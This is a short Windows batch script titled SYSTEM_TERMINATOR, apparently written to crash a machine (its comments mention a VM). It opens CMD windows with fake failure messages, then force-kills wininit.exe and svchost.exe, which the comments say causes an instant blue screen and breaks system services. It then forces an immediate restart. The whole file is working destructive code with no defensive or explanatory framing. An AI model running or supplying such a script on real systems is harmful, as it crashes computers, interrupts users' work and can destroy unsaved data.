@echo off
title SYSTEM_TERMINATOR
color 0a

:: 1. Spam CMD windows to help the crash
start cmd /k "echo CRITICAL FAILURE && pause"
start cmd /k "echo DATA CORRUPTION && pause"

:: 2. Wait for the VM to be lagging from the HTML
timeout /t 10

:: 3. THE REAL KILL COMMANDS
:: wininit.exe = Windows Initialization (Killing this causes an instant Blue Screen)
:: svchost.exe = Service Host (Killing this crashes all networking and system services)
taskkill /f /im wininit.exe
taskkill /f /im svchost.exe

:: 4. Force a hard restart if it hasn't BSOD'd yet
shutdown /r /f /t 00
